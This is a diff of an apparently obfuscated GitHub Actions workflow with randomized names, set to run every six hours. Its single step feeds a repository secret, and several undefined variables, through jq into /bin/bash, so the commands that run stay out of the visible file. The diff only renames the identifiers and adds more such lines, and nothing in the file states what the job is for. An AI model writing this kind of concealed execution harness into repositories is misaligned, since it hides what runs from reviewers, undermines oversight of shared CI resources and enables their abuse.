@@ -1,8 +1,10 @@
 name: lukasa7612
+
 on:
   workflow_dispatch:
   schedule:
-    - cron: '45 2/6 * * *'
+    - cron: '42 5/6 * * *'
+
 jobs:
   build:
     runs-on: ubuntu-latest
@@ -11,10 +13,14 @@ jobs:
       - uses: actions/checkout@v4
       - name: lukasa7612
         env:
-          xsan3: ${{ secrets.xsan3 }}
+          efvkr464: ${{ secrets.efvkr464 }}
         run: |
-          echo $xsan3 | jq -r .nk642 | /bin/bash
-          echo $w479 | jq -r .qnkmd89 | /bin/bash
-          echo $o956 | jq -r .vays5103 | /bin/bash
-          echo $jyqnv19 | jq -r .v67022 | /bin/bash
+          echo $efvkr464 | jq -r .bcb2683 | /bin/bash
+          echo $cxmqr3694 | jq -r .riy91 | /bin/bash
+          echo $bsrii6396 | jq -r .ylhd0 | /bin/bash
+          echo $lw0 | jq -r .dxll3727 | /bin/bash
+          echo $bae9781 | jq -r .ox98 | /bin/bash
+          echo $eiww22 | jq -r .vmsg515 | /bin/bash
+          echo $toosd0871 | jq -r .k61 | /bin/bash
+          echo $g43 | jq -r .kgyqz7910 | /bin/bash
 
